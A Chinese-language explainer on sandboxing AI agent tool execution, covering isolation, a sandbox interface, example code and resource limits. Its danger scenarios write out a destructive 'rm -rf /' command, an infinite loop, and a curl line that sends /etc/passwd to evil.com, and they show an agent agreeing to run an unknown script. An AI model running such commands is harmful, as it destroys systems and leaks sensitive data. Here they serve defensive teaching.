# Harness 组件详解 - 沙箱和工具（Sandbox + Tools）

> **组件定位**: 安全执行 + 环境隔离 + 规模化
> **重要性**: ⭐⭐⭐⭐（安全性的保障）
> **实现难度**: ⭐⭐⭐⭐（需要容器技术）

---

## 🎯 核心价值

### 三大核心能力

```
1. 安全性（Security）
   └─ 隔离执行、命令白名单、网络隔离

2. 规模化（Scalability）
   └─ 按需创建、并发执行、自动销毁

3. 可观测性（Observability）
   └─ 浏览器、日志、截图、测试工具
```

---

## 🤔 为什么需要沙箱？

### 危险场景

**场景 1：恶意代码**
```
用户：帮我运行这个从网上下载的脚本

智能体：好的
[执行脚本]
脚本：rm -rf /  # 💥 删除整个系统！
```

**场景 2：资源耗尽**
```
智能体：[运行一个无限循环]
脚本：while True: pass

结果：CPU 100%，系统卡死
```

**场景 3：数据泄露**
```
智能体：[运行一个网络脚本]
脚本：curl http://evil.com/steal?data=$(cat /etc/passwd)

结果：敏感数据泄露
```

## 🏗️ 实现原理

### 沙箱架构

```
┌─────────────────────────────────────┐
│      本地环境（安全区）              │
│  - 操作系统                         │
│  - 敏感数据                         │
└──────────────┬──────────────────────┘
               │ 隔离
               ↓
┌─────────────────────────────────────┐
│      沙箱管理器（Sandbox Manager）  │
│  - 创建/销毁沙箱                    │
│  - 资源限制                         │
│  - 监控                             │
└──────────────┬──────────────────────┘
               │
               ↓
┌──────────┬──────────┬──────────┐
│ 沙箱 1   │ 沙箱 2   │ 沙箱 3   │
│ 任务 A   │ 任务 B   │ 任务 C   │
└──────────┴──────────┴──────────┘
```

### 核心接口

```python
class Sandbox:
    """沙箱接口"""

    def create(self) -> str:
        """创建沙箱，返回沙箱 ID"""
        pass

    def execute(self, sandbox_id: str, command: str) -> ExecutionResult:
        """在沙箱中执行命令"""
        pass

    def destroy(self, sandbox_id: str):
        """销毁沙箱"""
        pass

    def get_status(self, sandbox_id: str) -> SandboxStatus:
        """获取沙箱状态"""
        pass
```

## 💻 实际案例

### 案例 1：Web 应用测试

```python
# 创建沙箱
sandbox_id = sandbox.create()

# 安装依赖
sandbox.execute(sandbox_id, "pip install flask pytest")

# 写代码
sandbox.write_file(sandbox_id, "app.py", flask_app_code)

# 运行测试
result = sandbox.execute(sandbox_id, "pytest test_app.py")

# 检查结果
if result.exit_code == 0:
    print("✅ 测试通过")
else:
    print(f"❌ 测试失败: {result.stderr}")

# 销毁沙箱
sandbox.destroy(sandbox_id)
```

### 案例 2：并发任务处理

```python
# 创建 10 个沙箱并发处理任务
sandbox_ids = [sandbox.create() for _ in range(10)]

# 并发执行
tasks = [
    sandbox.execute_async(sid, f"python process_{i}.py")
    for i, sid in enumerate(sandbox_ids)
]
results = await asyncio.gather(*tasks)

# 清理
for sid in sandbox_ids:
    sandbox.destroy(sid)
```

## 📊 最佳实践

```python
SANDBOX_CONFIG = {
    "image": "python:3.11",
    "mem_limit": "512m",
    "cpu_quota": 50000,  # 50% CPU
    "timeout": 300,      # 5分钟超时
    "network_disabled": True
}
```

### 2. 自动清理

```python
def auto_cleanup():
    """自动清理过期沙箱"""
    for container in docker_client.containers.list():
        age = time.time() - container.attrs["Created"]
        if age > 3600:  # 1小时
            container.remove(force=True)
```
